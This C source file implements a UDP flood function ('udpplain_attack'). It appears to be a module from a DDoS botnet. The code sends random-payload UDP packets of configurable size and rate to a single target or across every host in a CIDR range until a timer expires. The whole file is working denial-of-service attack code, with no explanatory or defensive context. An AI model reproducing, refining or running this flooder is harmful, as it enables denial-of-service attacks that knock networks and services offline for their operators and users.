#define _GNU_SOURCE
#include "headers/attack_params.h"

void* udpplain_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) {
        return NULL;
    }
    
    int psize_min = params->psize_min > 0 ? params->psize_min : 1;
    int psize_max = params->psize_max > 0 ? params->psize_max : psize_min;
    if (psize_min < 1) psize_min = 1;
    if (psize_max > 1500) psize_max = 1500;
    if (psize_max < psize_min) psize_max = psize_min;
    
    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0) {
        return NULL;
    }
    
    char data[1500];
    time_t end_time = time(NULL) + params->duration;
    ssize_t sent = 0;
    int usleep_min = params->usleep_min > 0 ? params->usleep_min : 0;
    int usleep_max = params->usleep_max > 0 ? params->usleep_max : 0;
    int use_usleep = usleep_min > 0;
    
    if (params->cidr > 0) {
        uint32_t base = ntohl(params->base_ip);
        uint32_t mask = params->cidr == 32 ? 0xFFFFFFFF : (~0U << (32 - params->cidr));
        uint32_t start = base & mask;
        uint32_t end = start | (~mask);
        struct sockaddr_in target = params->target_addr;
        while (time(NULL) < end_time && params->active) {
            int psize = psize_min == psize_max ? psize_min : psize_min + (rand() % (psize_max - psize_min + 1));
            
            for (int i = 0; i < psize; i++)
                data[i] = (unsigned char)(rand() & 0xFF);
            if (params->msg_len > 0 && params->msg) {
                size_t to_copy = params->msg_len < psize ? params->msg_len : psize;
                memcpy(data, params->msg, to_copy);
            }
            
            if (params->cidr == 32) {
                target.sin_addr.s_addr = htonl(start);
                sent = sendto(fd, data, psize, MSG_NOSIGNAL,
                       (struct sockaddr *)&target, sizeof(target));
                if (use_usleep) { int delay = usleep_min; if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1); usleep(delay); }
            } else if (params->cidr == 31) {
                target.sin_addr.s_addr = htonl(start);
                sent = sendto(fd, data, psize, MSG_NOSIGNAL,
                       (struct sockaddr *)&target, sizeof(target));
                if (use_usleep) { int delay = usleep_min; if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1); usleep(delay); }
                target.sin_addr.s_addr = htonl(end);
                sent = sendto(fd, data, psize, MSG_NOSIGNAL,
                       (struct sockaddr *)&target, sizeof(target));
                if (use_usleep) { int delay = usleep_min; if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1); usleep(delay); }
            } else {
                for (uint32_t ip = start + 1; ip < end; ++ip) {
                    target.sin_addr.s_addr = htonl(ip);
                    sent = sendto(fd, data, psize, MSG_NOSIGNAL,
                           (struct sockaddr *)&target, sizeof(target));
                    if (use_usleep) { int delay = usleep_min; if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1); usleep(delay); }
                }
            }
        }
    } else {
        while (time(NULL) < end_time && params->active) {
            int psize = psize_min == psize_max ? psize_min : psize_min + (rand() % (psize_max - psize_min + 1));
            
            for (int i = 0; i < psize; i++)
                data[i] = (unsigned char)(rand() & 0xFF);
            if (params->msg_len > 0 && params->msg) {
                size_t to_copy = params->msg_len < psize ? params->msg_len : psize;
                memcpy(data, params->msg, to_copy);
            }
            
            sent = sendto(fd, data, psize, MSG_NOSIGNAL,
                   (struct sockaddr *)&params->target_addr, sizeof(params->target_addr));
            if (use_usleep) { int delay = usleep_min; if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1); usleep(delay); }
        }
    }
    close(fd);
    return NULL;
}
